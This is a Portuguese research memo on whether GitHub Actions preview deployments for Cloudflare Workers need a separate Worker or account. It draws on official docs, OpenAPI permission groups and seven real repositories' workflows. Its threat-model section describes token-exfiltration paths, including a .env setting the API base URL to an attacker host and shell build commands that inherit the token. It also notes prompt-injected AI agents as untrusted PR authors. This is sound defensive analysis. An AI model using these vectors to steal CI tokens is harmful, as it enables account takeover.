# Pesquisa 19b — Worker Previews na prática: recomendação oficial, repositórios reais e risco de um Worker de preview separado

Ticket: [19-pr-ci-security](../issues/19-pr-ci-security.md) (Q3: Worker de preview separado) · Pesquisado em 2026-10-18
Complementa: [19-pr-ci-security](19-pr-ci-security.md) §3 (permissões, `--config`, redirect, base config) e [05-pr-preview-environments](05-pr-preview-environments.md). Não repete o que está lá.

Versões consultadas:
- **Docs Cloudflare** (`developers.cloudflare.com`, lidas como `index.md` em 2026-10-18). A data "Last updated" de cada página está ao lado de cada citação.
- **Changelog** [Worker Previews, 2026-09-22](https://developers.cloudflare.com/changelog/post/2026-09-22-worker-previews/) e [Granular Worker permissions, 2026-09-15](https://developers.cloudflare.com/changelog/post/2026-09-15-granular-worker-permissions/). **Blog** [Introducing Worker Previews](https://blog.cloudflare.com/worker-previews/) (publicado em 2026-09-22T13:00Z).
- **`cloudflare/workers-sdk`** no commit [`0d826c6`](https://github.com/cloudflare/workers-sdk/tree/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001) (2026-10-18), com wrangler **4.151.1**.
- **OpenAPI da Cloudflare**: [`cloudflare/api-schemas`](https://github.com/cloudflare/api-schemas/blob/e91e65be9898b6bc400231f36ce77e8e7d5a02ab/openapi.json), commit `e91e65b` (2026-10-17). O campo `x-api-token-group` diz quais grupos de permissão de token cada endpoint aceita.
- **`cloudflare/wrangler-action`** v4.1.3 (2026-09-24).
- **Repositórios reais**: cada um aparece com o SHA do commit e a data, na seção 3.

Convenção: **Fonte diz** é afirmação de doc, código ou schema. **Inferência** é leitura minha.

---

## Resposta

1. **A Cloudflare recomenda Previews no mesmo Worker da produção.** Os docs não mencionam, em lugar nenhum, um Worker ou uma conta separada para previews por motivo de segurança:
   - "Previews give each branch an isolated, production-like environment **under the same Worker**" ([Previews](https://developers.cloudflare.com/workers/previews/), 2026-09-24);
   - as Wrangler environments, que são Workers separados, ficam para ambientes **persistentes** como staging ([Compare workflows](https://developers.cloudflare.com/workers/previews/compare-workflows/), 2026-09-22);
   - o exemplo oficial de GitHub Actions usa **um token só**, num job `pull_request` que roda o código do PR ([Examples](https://developers.cloudflare.com/workers/previews/examples/), 2026-10-01);
   - o Workers Builds recomenda "consistently use the same API token across all uploads and deployments" ([Builds › Configuration](https://developers.cloudflare.com/workers/ci-cd/builds/configuration/#api-token), 2026-09-22).
2. **Os repositórios reais seguem o mesmo padrão.** Dos 7 analisados, 5 usam **o mesmo Worker e o mesmo secret** de token para preview e produção: `cloudflare/cloudflare-docs`, `cloudflare/nimbus`, `cloudflare/workers-sdk`, `withastro/docs` e `besidka/besidka`. O `pdx-tools` usa o mesmo Worker, mas um secret com outro nome, de escopo desconhecido. O `cloudflare-os` faz deploy numa conta indicada por variável, e não ficou claro se ela é separada. **Nenhum** usa um Worker `-preview` separado. O que eles separam é **onde o código do PR roda**:
   - o `nimbus` e o `pdx-tools` fazem build sem token e deploy com o código da `main`, como o nosso desenho;
   - a Cloudflare, nos próprios repositórios, restringe previews com token a branches de quem tem write access.
3. **Achado novo e decisivo: hoje, talvez nem seja possível dar a um token acesso só a um Worker para fazer Previews.**
   - **Fonte diz:** no OpenAPI de 2026-10-17, os endpoints de Preview **não listam os papéis por Worker**:
     - `Delete Preview` aceita só `Workers Scripts Write`;
     - `Create Preview`, `Create Preview Deployment` e `Patch Latest Preview Deployment` não declaram grupo nenhum;
     - endpoints de produção, como `Create Worker Version`, aceitam `Individual Workers Editor`.
   - **Fonte diz:** a issue aberta [workers-sdk#15797](https://github.com/cloudflare/workers-sdk/issues/15797) (2026-09-23) relata que um token account-owned com **Workers Editor + Individual Workers Editor/Admin** recebe `Authentication error [code: 10000]` no `POST …/previews`.
   - **Inferência:**
     - o token que funciona para previews hoje é provavelmente o legado **"Workers Scripts Edit"**, que vale para **todos os Workers da conta**. Um Worker `app-preview` com esse token **não impede** um `wrangler deploy` do Worker `app`;
     - a única fronteira de token real seria uma **conta Cloudflare separada**.
     - **Precisa de teste** antes de qualquer decisão.
4. **Com a separação `build` sem secrets → `deploy` com YAML e código da `main`, o código do PR só alcança o token por poucos caminhos**, todos fecháveis com regras simples (§4):
   - um **`.env` no diretório onde o wrangler roda**: o wrangler carrega `.env`/`.env.local` do cwd, e um `CLOUDFLARE_API_BASE_URL` ali envia o token para outro host;
   - um **config do wrangler vindo do artifact**: `build.command` roda em shell com o token no ambiente;
   - o redirect `.wrangler/deploy/config.json`;
   - um `wrangler` dentro do artifact;
   - injeção de expressões do GitHub Actions a partir do conteúdo do artifact.

   O `wrangler preview` **não executa** o bundle nem os assets: só faz upload. O esbuild só empacota.
5. **Em runtime, o Worker do preview nunca recebe o token da API.** Ele só alcança dados de produção pelo que estiver no bloco `previews` da `main`, por service binding (que sempre chama a produção) ou pela internet pública. **Um Worker separado na mesma conta não muda nada disso.** O que um Worker separado não isola, e só uma conta separada isolaria, é a **cota diária de 100 mil requests do Free, que é por conta**.

**Conclusão (inferência):** com a separação de jobs aceita na rodada 1 e as regras da §4, um Worker de preview separado na **mesma conta** reduz pouco o risco. Se o ponto 3 se confirmar, não reduz nada, porque o token de preview seria account-wide de qualquer jeito. O usuário tem razão em chamar de burocracia. As alternativas são:
- **(a) mesmo Worker e mesmo token**, mais as regras da §4. É o que a Cloudflare e os repositórios reais fazem;
- **(b) conta Cloudflare separada para previews**, se quisermos uma fronteira real de token e de cota. Custa uma segunda conta Free e um token a mais, e os previews perdem o custom domain da produção.

---

## 1. O que a documentação oficial diz

### 1.1 Modelo e fluxo recomendado

- **Fonte diz:** "Running `npx wrangler preview` creates or updates a Preview for your current branch under the same Worker. As you use `npx wrangler deploy` for production, use `npx wrangler preview` to test a branch before merging." ([Previews](https://developers.cloudflare.com/workers/previews/), 2026-09-24)
- **Fonte diz:** "Previews are the recommended way to test changes before production." As Wrangler environments "create separately named Workers… Use them when development, staging, or other environments need persistent Workers". Também é possível criar Previews sob um environment (`env.staging.previews`, `wrangler preview --env staging`) ([Compare workflows](https://developers.cloudflare.com/workers/previews/compare-workflows/), 2026-09-22).
- **Fonte diz:** o blog apresenta isso como vantagem: "Unlike Wrangler environments, where each environment requires deploying and managing a separate Worker, Previews keep that isolation in one dashboard view" ([Blog](https://blog.cloudflare.com/worker-previews/), 2026-09-22).
- **Fonte diz:** as Version URLs (`versions upload --preview-alias`) "use production resources… Do not use Version URLs for branch or pull request testing. Use Previews instead." ([Compare workflows](https://developers.cloudflare.com/workers/previews/compare-workflows/))
- **Status "beta":**
  - os docs e o changelog **não** usam "beta". O blog só menciona um "private beta" anterior ([Blog](https://blog.cloudflare.com/worker-previews/));
  - o código marca **todos** os comandos `preview*` com `status: "open beta"` ([`preview/preview.ts` L22](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/preview/preview.ts#L22));
  - o OpenAPI marca os endpoints com `x-fern-availability: beta`.
- **Versão mínima (divergência):**
  - os docs pedem "Wrangler 4.135.0 or later" ([Get started](https://developers.cloudflare.com/workers/previews/get-started/), 2026-09-22);
  - o README do `wrangler-action` pede "4.136.3 or newer" ([README](https://github.com/cloudflare/wrangler-action/blob/d3cfe7456c14d339eb4391c81662629e6ff6aace/README.md), 2026-09-24).

### 1.2 O que é e o que não é compartilhado com a produção

| Item | Comportamento | Fonte |
| --- | --- | --- |
| vars, bindings, `define`, `tail_consumers` | "Previews do not inherit production settings" e vêm do bloco `previews` | [Configuration](https://developers.cloudflare.com/workers/previews/configuration/) (2026-09-22) |
| Secrets | vêm só da Base config ou do Preview. No import pelo dashboard, "You must re-enter secrets manually" | idem |
| KV, D1, R2, Hyperdrive, Queues etc. | "Two Previews bound to the same account-level resource ID or name share its data". Isolar exige apontar para outro recurso | [Resources](https://developers.cloudflare.com/workers/previews/resources/) (2026-09-22) |
| Durable Objects e Containers | namespace novo por Preview, automático, apagado junto com o Preview | idem |
| Service bindings | "call the bound Worker's production deployment" | idem |
| Workflows | usam o Workflow existente, com o código e os bindings dele | idem |
| Queues | o Preview produz e não consome. "messages a Preview produces to a production Queue can be consumed by production" | idem |
| Routes, Custom Domains, Cron | "Previews do not take over zone routes, production custom domains, Queue consumers, or other production triggers" | idem |
| Observability | "These settings are independent from production". `wrangler tail` não suporta Previews | [Test and debug](https://developers.cloudflare.com/workers/previews/test-and-debug/) (2026-10-10) |
| `compatibility_*`, `assets` | só no nível de cima. "`npx wrangler preview` uploads assets from the branch you are previewing" | [Configuration](https://developers.cloudflare.com/workers/previews/configuration/) |
| URL | `<preview>-<worker>.<sub>.workers.dev`, com `X-Robots-Tag: noindex`. **Pública por padrão**, e Access é opcional | [Previews](https://developers.cloudflare.com/workers/previews/), [Custom domains](https://developers.cloudflare.com/workers/previews/custom-domains/) (2026-09-24) |

- **Fonte diz (código):** o fluxo do `wrangler preview` só escreve em recursos de Preview: `createPreview`, `editPreview`, `createPreviewDeployment`, e `deletePreview` no delete. A única exceção é criar o "parent Worker" quando o Worker ainda não existe. Isso exige Admin, e o CLI confirma por padrão em CI (`defaultValue: true, fallbackValue: true`) ([`deploy-helpers/src/preview/preview.ts` L1047-1080](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/deploy-helpers/src/preview/preview.ts#L1047-L1080); [`api.ts` L178-310](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/deploy-helpers/src/preview/api.ts#L178-L310)).
  - **Inferência:** o **comando** `preview` nunca altera a produção. O que pode alterar é o **token**, que também faz `wrangler deploy`.

### 1.3 Limites, retenção e limpeza

- **Fonte diz:**

  | Limite | Free | Pago |
  | --- | --- | --- |
  | Previews por Worker | 100 | 500 |
  | Deployments por Preview | 100 | 100 |

  Ao chegar no limite, "Cloudflare automatically deletes the oldest". A limpeza manual é `wrangler preview delete --name <preview-name>` ([Previews › Limits](https://developers.cloudflare.com/workers/previews/#limits), 2026-09-24).
- **Não documentado:** um TTL ou expiração por tempo. O `cloudflare-os` comenta: "GitHub has no equivalent of GitLab's `environment.auto_stop_in`", e por isso roda um sweep noturno ([preview.yml L37-40](https://github.com/cloudflare/cloudflare-os/blob/82b0c09f995175ed728d47e04298ca26c741fc5c/.github/workflows/preview.yml#L37-L40)).
- **Bugs abertos de limpeza** (issues, não verificados por mim):
  - [#15945](https://github.com/cloudflare/workers-sdk/issues/15945) (2026-09-29): o `preview delete` funciona, mas a URL continua servindo o código antigo;
  - [#16170](https://github.com/cloudflare/workers-sdk/issues/16170) (2026-10-09): previews de branches apagadas continuam servindo e não podem ser apagados (10025).

  **Inferência:** um preview de código malicioso pode continuar no ar depois do `delete`. É mais um motivo para o preview nunca ter segredos ou dados valiosos.

### 1.4 Um preview pode afetar o tráfego de produção?

- **Pelo roteamento, não.** As rotas e domínios de produção só servem a produção (tabela acima).
- **Por recursos compartilhados, sim, se o config permitir.** Exemplos: um Queue de produção consumido pela produção, Workflows, service bindings, ou KV/D1/R2 com o mesmo ID (tabela acima).
- **Pela cota da conta, possivelmente.** **Fonte diz:** "Accounts on the Workers Free plan have a daily request limit of 100,000 requests… When a Worker exceeds this limit, Cloudflare returns Error 1027" ([Limits](https://developers.cloudflare.com/workers/platform/limits/#daily-requests), 2026-10-12). "Requests to static assets are free and unlimited" ([Pricing](https://developers.cloudflare.com/workers/platform/pricing/), 2026-10-02).
  - **Não documentado:** se requests a Previews contam nessa cota. **Inferência:** a cota é **por conta**, então um Worker separado na mesma conta não protege a produção disso. Só uma conta separada protegeria.

### 1.5 Permissões de token para cada comando

- **Fonte diz (docs):**
  - desde 2026-09-15 existem os papéis Metadata Read-Only, Content Read-Only, Editor e Admin, por Worker ou por produto. "Give **Editor** to a CI/CD workflow so it can deploy without deleting the Worker or accessing other Workers" ([Changelog 2026-09-15](https://developers.cloudflare.com/changelog/post/2026-09-15-granular-worker-permissions/));
  - a tabela de comandos do wrangler **não cita** `preview`. O legado "Workers Scripts Edit" equivale a "`Editor` at the Workers product scope", ou seja, a todos os Workers ([Workers roles](https://developers.cloudflare.com/workers/authorization/workers/), 2026-09-15);
  - o exemplo de Previews pede "permission to edit Workers Scripts", que é o nome do grupo **legado** ([Examples](https://developers.cloudflare.com/workers/previews/examples/));
  - o guia de CI manda usar o template "Edit Cloudflare Workers" e "scoping these down as much as possible" ([GitHub Actions](https://developers.cloudflare.com/workers/ci-cd/external-cicd/github-actions/), 2026-10-18).
- **Fonte diz (código):** quais endpoints cada comando chama:

  | Comando | Endpoints (`/accounts/:id/workers/workers/:worker…`) | Fonte |
  | --- | --- | --- |
  | `wrangler preview` | `GET /previews/:p`, `POST /previews`, `PATCH /previews/:p`, `POST /previews/:p/deployments`, upload de assets. `POST /workers/workers` só se o Worker não existir | [`api.ts`](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/deploy-helpers/src/preview/api.ts#L178-L330) |
  | `wrangler preview delete` | `DELETE /previews/:p` | [`api.ts` L255](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/deploy-helpers/src/preview/api.ts#L255) |
  | `wrangler preview secret put/delete` | `PATCH /previews/:p/deployments/latest` | [`preview/secrets/index.ts` L65-75](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/preview/secrets/index.ts#L65-L75) |
  | `wrangler preview base-config …` | `PATCH /workers/workers/:worker` (campo `previews_base_config`) | [`api.ts` L364](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/deploy-helpers/src/preview/api.ts#L364) |

- **Fonte diz (OpenAPI, `x-api-token-group`, 2026-10-17)** ([openapi.json](https://github.com/cloudflare/api-schemas/blob/e91e65be9898b6bc400231f36ce77e8e7d5a02ab/openapi.json)):

  | Endpoint | Grupos aceitos |
  | --- | --- |
  | `POST …/previews` (Create Preview) | *não declarado* |
  | `POST …/previews/:p/deployments` | *não declarado* |
  | `PATCH …/previews/:p/deployments/latest` | *não declarado* |
  | `PATCH …/previews/:p`, `PUT …/previews/:p` | *não declarado* / `Workers Scripts Write` |
  | `DELETE …/previews/:p` | **só** `Workers Scripts Write` |
  | `GET …/previews…` | `Workers Tail Read`, `Workers Scripts Write`, `Workers Scripts Read` |
  | `PATCH /workers/workers/:worker` (base config) | `Workers Scripts Write`, `Workers Admin`, `Workers Editor`, `Individual Workers Admin`, `Individual Workers Editor` |
  | `POST …/assets-upload-session` | `Workers Scripts Write` |
  | *Comparação:* `POST …/versions` (produção) | `Workers Scripts Write`, `Workers Editor`, `Individual Workers Editor`… |

- **Fonte diz (issue):** a [workers-sdk#15797](https://github.com/cloudflare/workers-sdk/issues/15797) foi aberta em 2026-09-23 e segue aberta, com labels `package:wrangler` e `auth`. Ela relata: "Grant an account-owned token **Workers Editor** on the account and **Individual Workers Editor** on that Worker. We also tried **Individual Workers Admin**… `POST …/previews` → `Authentication error [code: 10000]`". Também diz que "the bound resource permissions are not needed to reproduce it". Não há resposta da Cloudflare, só a triagem automática.
- **Inferência (incerta, precisa de teste):**
  - hoje, os endpoints de Preview parecem aceitar só os grupos **legados**, que valem para a conta inteira;
  - um token "Specified Workers: `app-preview`, Editor" provavelmente **falha** no `wrangler preview`, e o token que funciona (Workers Scripts Edit) também edita o `app`;
  - **isso esvazia a premissa** do Worker de preview separado: "token que só alcança o preview".
  - **Teste sugerido:** criar um token account-owned "Specified Workers → `app`, Editor". Rodar `wrangler preview --name probe` e depois `wrangler preview delete --name probe`. Repetir com o legado "Workers Scripts Edit".

---

## 2. Action oficial e exemplos da Cloudflare

- **Docs (exemplo oficial)** ([Examples](https://developers.cloudflare.com/workers/previews/examples/), 2026-10-01):
  - workflow `on: pull_request` com `actions/checkout`, "Add required install or build steps before the Preview step", e `npx wrangler preview --name "pr-${{ github.event.pull_request.number }}" --json` com o token no `env`;
  - limpeza no evento `closed` com `preview delete --skip-confirmation`;
  - sobre forks: "Repository secrets are unavailable to forked pull requests by default. Before exposing Cloudflare credentials, verify that `github.event.pull_request.head.repo.full_name == github.repository`".
  - **Inferência:** o exemplo oficial roda install e build **do PR** no mesmo job do token. O modelo de confiança é "quem consegue fazer push no repositório é confiável". Esse modelo não vale quando o autor do branch é um agente sujeito a prompt injection.
- **`cloudflare/wrangler-action` v4.1.3** ([README](https://github.com/cloudflare/wrangler-action/blob/d3cfe7456c14d339eb4391c81662629e6ff6aace/README.md), 2026-09-24):
  - os dois exemplos de Previews usam `on: [pull_request]`, `command: preview --name pr-${{ github.event.pull_request.number }}` e `apiToken: ${{ secrets.CLOUDFLARE_API_TOKEN }}`;
  - expõe `preview-url`, `preview-deployment-url` e similares, e cria um GitHub Deployment;
  - **não menciona** forks, `pull_request_target`, `workflow_run` nem código não confiável.
- **Detalhe do `wrangler-action` que importa para nós.** **Fonte diz:** ele roda `wrangler --version` via `execNoInstall` no `workingDirectory` e, sem `wranglerVersion`, usa "pre-installed wrangler" ([`wranglerAction.ts` L93-145](https://github.com/cloudflare/wrangler-action/blob/950069986814ffeaec7d90c9b32474fba9d3c165/src/wranglerAction.ts#L93-L145)). **Inferência:** se o `workingDirectory` contiver um `node_modules` vindo do PR, o action executa o wrangler do PR com o token. Portanto o `workingDirectory` deve ser o checkout da `main`.
- **Workers Builds**, o CI da própria Cloudflare:
  - o "Preview command" padrão é `npx wrangler preview` e roda depois do build command do branch ([Builds › Configuration](https://developers.cloudflare.com/workers/ci-cd/builds/configuration/), 2026-09-22; [Build branches](https://developers.cloudflare.com/workers/ci-cd/builds/build-branches/), 2026-10-01);
  - o token gerado automaticamente tem "Workers Scripts (edit), Workers KV Storage (edit), Workers R2 Storage (edit)… Workers Routes (edit) for all zones", e "only user tokens are supported" (mesma página);
  - **não documentado:** como o Workers Builds trata PRs de fork.
- **Templates:** `cloudflare/templates` não tem workflow com `wrangler preview` (busca de código em 2026-10-18 sem resultados). Não há template oficial de preview em GitHub Actions além dos docs e do README do action.

---

## 3. Repositórios reais

| Repositório e arquivo (commit, data) | Gatilho | Mesmo Worker que a produção? | Mesmo token? | Onde o código do PR roda |
| --- | --- | --- | --- | --- |
| **cloudflare/cloudflare-docs**: [`ci.yml`](https://github.com/cloudflare/cloudflare-docs/blob/c662b9362beb3a945ffe558ebbc9c98d5fa2e83c/.github/workflows/ci.yml#L245-L306) (`c662b93`, 2026-10-16), [`preview-cleanup.yml`](https://github.com/cloudflare/cloudflare-docs/blob/a5d7e03c5d8086668257550802a61b3409584b9b/.github/workflows/preview-cleanup.yml) | `pull_request` só de branches do repo (`head.repo.full_name == github.repository`) | **Sim**: `wrangler.preview.json` e `wrangler.jsonc` têm `"name": "cloudflare-docs"`, e a produção serve `developers.cloudflare.com/*` ([preview](https://github.com/cloudflare/cloudflare-docs/blob/a5d7e03c5d8086668257550802a61b3409584b9b/wrangler.preview.json), [prod](https://github.com/cloudflare/cloudflare-docs/blob/35a5849262d59a243e85a19479193713a9cd35f4/wrangler.jsonc)) | **Sim**: `secrets.CLOUDFLARE_API_TOKEN` também no `wrangler deploy` de [`publish-production.yml`](https://github.com/cloudflare/cloudflare-docs/blob/0995de89d03ff8eafd9685b9b574b587c62acbb8/.github/workflows/publish-production.yml) | O build vai para um job separado, mas o job de deploy faz checkout do **PR** e `pnpm install` antes do `wrangler preview --config wrangler.preview.json`. O código do PR roda com o token |
| **cloudflare/nimbus**: [`fork-preview.yml`](https://github.com/cloudflare/nimbus/blob/3548032410524dcb19cbc5cbbf56e466880e0256/.github/workflows/fork-preview.yml) (`3548032`, 2026-10-14) | build em `pull_request` sem secrets, deploy em **`workflow_run`** com YAML da `main` e label `pr preview` aplicado por maintainer | **Sim**: Worker `nimbus-docs` ([`apps/www/wrangler.jsonc`](https://github.com/cloudflare/nimbus/blob/3548032410524dcb19cbc5cbbf56e466880e0256/apps/www/wrangler.jsonc)) | **Sim**: mesmo `environment: cloudflare` e mesmo `secrets.CLOUDFLARE_API_TOKEN` do `wrangler deploy` em [`release.yml`](https://github.com/cloudflare/nimbus/blob/eaf61973d42cba4af00df89ffff9aefa3a0f1350/.github/workflows/release.yml) | **Nunca** junto com o token. "The built files are treated as untrusted data: no PR code runs here". Detalhes abaixo |
| **cloudflare/cloudflare-os**: [`preview.yml`](https://github.com/cloudflare/cloudflare-os/blob/82b0c09f995175ed728d47e04298ca26c741fc5c/.github/workflows/preview.yml) (`82b0c09`, 2026-10-02) | `pull_request` + `schedule` (sweep). Proíbe explicitamente `pull_request_target`, `workflow_run` e `issue_comment` | Conta indicada por `vars.CLOUDFLARE_ACCOUNT_ID`, comentada como "a Cloudflare-owned account". **Incerto** se é separada da produção | Token "can create Workers, KV namespaces and R2 buckets" | Job único com install e deploy do PR. Confiança restrita a autores com write, verificada pela API |
| **cloudflare/workers-sdk**: [`deploy-previews.yml`](https://github.com/cloudflare/workers-sdk/blob/ee26b7da9213f35d2639c575b1cbfc15cc25086a/.github/workflows/deploy-previews.yml) (`ee26b7d`, 2026-06-19) | `pull_request` com label `preview:*`, só para o owner `cloudflare` | **Sim**: `quick-edit` faz `versions upload` (preview) e `deploy` no mesmo Worker ([package.json](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/quick-edit/package.json)) | **Sim**: `secrets.CLOUDFLARE_API_TOKEN`, também em [`changesets.yml`](https://github.com/cloudflare/workers-sdk/blob/9be5ec7cf2c3988d0a446a5207d0d23def541cf5/.github/workflows/changesets.yml) | Build do PR no job com token. Ainda usa Version URLs, o modelo antigo |
| **pdx-tools/pdx-tools**: [`preview.yml`](https://github.com/pdx-tools/pdx-tools/blob/b1b5b90604b6dbe1d336731e7d48498ba69c779e/.github/workflows/preview.yml) (`b1b5b90`, 2026-10-17) | `pull_request` (mesmo repo) + `pull_request_target` (fork com label `safe to test`) + `workflow_run` (master) | **Sim**: `name = "pdx-tools-workers"` com bloco `previews` ([`wrangler.toml`](https://github.com/pdx-tools/pdx-tools/blob/228ec702184bf60164daa6bb1e803c8a3ec9ff13/src/app/wrangler.toml)) | Secret **próprio**, `CLOUDFLARE_PREVIEW_API_TOKEN`, de escopo não visível. A produção não sai deste repositório | **Build sem token → deploy com checkout da `main`**: "Keep the Cloudflare token out of the build job, which runs pull request code" e "Explicit `--config` prevents the build config from adding bindings". É igual ao nosso desenho |
| **besidka/besidka**: [`preview-fork-deploy.yml`](https://github.com/besidka/besidka/blob/9cc5828f6ca0020d6f7ce721593dac92aa48d9b3/.github/workflows/preview-fork-deploy.yml) (`9cc5828`, 2026-10-12) | `issue_comment` `/deploy-preview`, conferindo se quem comentou tem write | **Sim**: `wrangler preview --env production`, Worker `besidka` ([`wrangler.jsonc`](https://github.com/besidka/besidka/blob/0ae70bbcd92be91cfe77ee7c628758198cd8c659/wrangler.jsonc)) | **Sim**: `secrets.CLOUDFLARE_API_TOKEN`, também em [`production.yml`](https://github.com/besidka/besidka/blob/9cc5828f6ca0020d6f7ce721593dac92aa48d9b3/.github/workflows/production.yml) | Checkout da base, `pnpm install --ignore-scripts`, artifact em `.output/` |
| **withastro/docs**: [`deploy.yml`](https://github.com/withastro/docs/blob/d4bbc1826573070ef1955e11e90d96459f3716d7/.github/workflows/deploy.yml) + [`deploy-preview.yml`](https://github.com/withastro/docs/blob/d4bbc1826573070ef1955e11e90d96459f3716d7/.github/workflows/deploy-preview.yml) (`d4bbc18`, 2026-10-14) | build em `pull_request` (inclusive forks), deploy em `workflow_run` | **Sim**: `preview --worker-name docs` (Worker `docs`, o mesmo da produção) | **Sim**: `secrets.CLOUDFLARE_API_TOKEN`, o mesmo do `command: deploy` | **Antiexemplo (inferência):** o artifact inclui o **`wrangler.jsonc` do PR**, baixado na raiz do workspace sem checkout. Ver §4 |

**Detalhes do `nimbus`, a referência mais próxima do nosso desenho** ([fork-preview.yml](https://github.com/cloudflare/nimbus/blob/3548032410524dcb19cbc5cbbf56e466880e0256/.github/workflows/fork-preview.yml#L73-L105)):
- faz checkout da `main`;
- `pnpm install --frozen-lockfile --ignore-scripts`;
- baixa o artifact em `${{ runner.temp }}`;
- **rejeita `_worker.js`** ("Fork Previews serve static assets only");
- **substitui `_redirects`** pelos da `main` e **apaga `.assetsignore`**;
- escreve `_headers` com `noindex`;
- roda `wrangler preview … --ignore-base-config` no diretório da `main`;
- o label que libera o deploy é removido depois de cada build.

**Prática comum (inferência):**
- o mesmo Worker e o mesmo token servem para preview e produção, inclusive nos repositórios da própria Cloudflare;
- nenhum repositório analisado usa um Worker de preview separado como fronteira de segurança;
- **a fronteira usada é a confiança no autor do PR** (só branches do repositório, só write access, label de maintainer) ou, nos mais cuidadosos (`nimbus`, `pdx-tools`), **o código do PR nunca roda no job do token**. O nosso desenho, com `pull_request_target` e `build` → `deploy` da `main`, é desse segundo grupo.

---

## 4. Caminhos do código do PR até o token no job `deploy`

Premissas: o `deploy` roda o YAML da `main` (`pull_request_target`) numa VM nova, faz checkout da `main`, instala dependências pelo lockfile da `main` e só recebe **artifacts** do `build`.

### 4.1 O que o wrangler executa ou interpreta no deploy

| Vetor | Comportamento | Fonte | Risco no nosso desenho |
| --- | --- | --- | --- |
| **Bundle JS** (`worker.js` / módulos) | Com `no_bundle: true`, "Wrangler will not process your code". Sem ele, o esbuild **empacota** e não executa. Os arquivos sobem como módulos | [Bundling](https://developers.cloudflare.com/workers/wrangler/bundling/); [`preview.ts` L105-125](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/preview/preview.ts#L105-L125) | Nenhum na máquina de CI. O código só roda na Cloudflare, no Preview |
| **Assets** (`dist/client`) | Sobem como arquivos. `_headers` e `_redirects` são regras de runtime do Preview. Um `_worker.js` sem `.assetsignore` dá **erro**: "could expose your private server-side code" | [`assets.ts` L732-760](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/deploy-helpers/src/deploy/helpers/assets.ts#L732-L760) | Nenhum para o token. Afetam só o preview, como no `nimbus` |
| **Config do wrangler** | Só JSON ou TOML, sem código (`wrangler.json`, `.jsonc`, `.toml`). É procurado subindo a partir do cwd quando não há `--config` | [`config-helpers.ts` L64-66](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/workers-utils/src/config/config-helpers.ts#L64-L66) | **Alto se vier do artifact.** Ver `build.command` abaixo |
| **`build.command`** do config | Roda **sempre** antes do bundle, também no `preview` (`getEntry` → `runCustomBuild`), via `shell: true`, herdando `process.env`, que inclui `CLOUDFLARE_API_TOKEN` | [`entry.ts` L99](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/deployment-bundle/entry.ts#L99); [`run-custom-build.ts` L22-45, L109-117](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/deployment-bundle/run-custom-build.ts#L22-L45) | **Execução de código com o token**, se o config vier do PR. Com o `--config` da `main`, o comando é da `main` |
| **Redirect `.wrangler/deploy/config.json`** | O `preview` segue o redirect, e o `--config` explícito o ignora | [`preview.ts` L77](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/preview/preview.ts#L77); já documentado em [19 §3.2](19-pr-ci-security.md) | Fechado com `--config` |
| **`.env` / `.env.local` no cwd** | Em **todo** comando, o wrangler carrega `.env` e `.env.local` (mais `.env.<env>` com `--env`) do diretório atual para o **próprio** `process.env`. O env do processo prevalece, mas variáveis **ausentes** passam a valer | [`index.ts` L703-711](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/index.ts#L703-L711); [`dot-env.ts` L19, L72](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/config/dot-env.ts); [System env vars](https://developers.cloudflare.com/workers/wrangler/system-environment-variables/) (2026-10-01) | **Exfiltração do token:** `CLOUDFLARE_API_BASE_URL=https://atacante/…` faz o wrangler mandar `Authorization: Bearer <token>` para outro host ([`misc-variables.ts` L153-167](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/workers-utils/src/environment-variables/misc-variables.ts#L153-L167); [`cfetch/internal.ts`](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/cfetch/internal.ts)). Só acontece se o artifact cair no **cwd** do wrangler |
| **`.cloudflare/output`** | O wrangler se recusa a rodar se encontrar um Build Output | [`cf-build-output-guard.ts`](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/deployment-bundle/cf-build-output-guard.ts) | Só causa falha, não vaza nada |
| **Binário do wrangler** | `npx wrangler` e o `wrangler-action` resolvem o `node_modules/.bin` do diretório atual | [`wranglerAction.ts`](https://github.com/cloudflare/wrangler-action/blob/950069986814ffeaec7d90c9b32474fba9d3c165/src/wranglerAction.ts#L93-L145) | **Alto** se o cwd tiver `node_modules` do PR |

### 4.2 Caminhos fora do wrangler (GitHub Actions)

Já cobertos em [19-pr-ci-security](19-pr-ci-security.md):
